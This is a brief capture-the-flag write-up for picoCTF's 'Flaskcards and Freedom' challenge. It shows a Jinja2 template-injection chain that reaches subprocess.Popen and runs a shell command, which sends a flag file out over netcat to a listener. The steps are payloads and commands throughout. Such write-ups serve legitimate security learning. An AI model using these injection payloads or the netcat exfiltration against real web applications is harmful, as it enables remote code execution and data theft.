# Flaskcards and Freedom

1. Register and login
2. Create new card `{{ ''.__class__.__mro__[1].__subclasses__() }}`
3. Find index of subprocess.Popen class (in my case it's 525)
4. On picoCTF shell execute command: `nc -l -p 12345` (you can use any port that works)
5. Add another card `{{ ''.__class__.__mro__[1].__subclasses__()[525].__call__(['sh', '-c', 'cat flag | nc 2018shell.picoctf.com 12345' ]) }}` (the flag won't be displayed in the browser, you need to check netcat output)
